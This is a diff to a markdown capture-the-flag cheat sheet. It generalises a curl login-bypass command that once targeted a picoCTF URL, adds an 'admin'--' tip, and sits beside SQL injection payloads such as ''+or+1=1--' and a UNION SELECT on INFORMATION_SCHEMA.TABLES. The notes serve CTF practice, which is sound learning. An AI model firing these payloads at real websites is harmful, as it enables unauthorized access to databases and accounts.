@@ -29,8 +29,9 @@ we can see all files running in the process with given process id.
 * john the ripper :- tool for password cracking
 
 ## <a name = "web">Web</a>
-* curl "https://2019shell1.picoctf.com/problem/4162/login.php" --data "username=admin&password='+or+1=1--" && echo 
-this command will find the password to username admin stored in database.
+* curl "url" --data "username=admin&password='+or+1=1--" && echo 
+this command will find the information to username admin stored in database (SQL injection).
+* try admin'-- for SQLi.
 * Robots -->>> url/robots.txt (shows hidden info)
 * Basic Injection  if there is a hidden info in the data base then to leak the data type 'OR''=' in the info bar.
 * 1 union select 1,TABLE_NAME, 3,4 from INFORMATION_SCHEMA.TABLES     input this code in the info bar of a website for sql attack using injection.
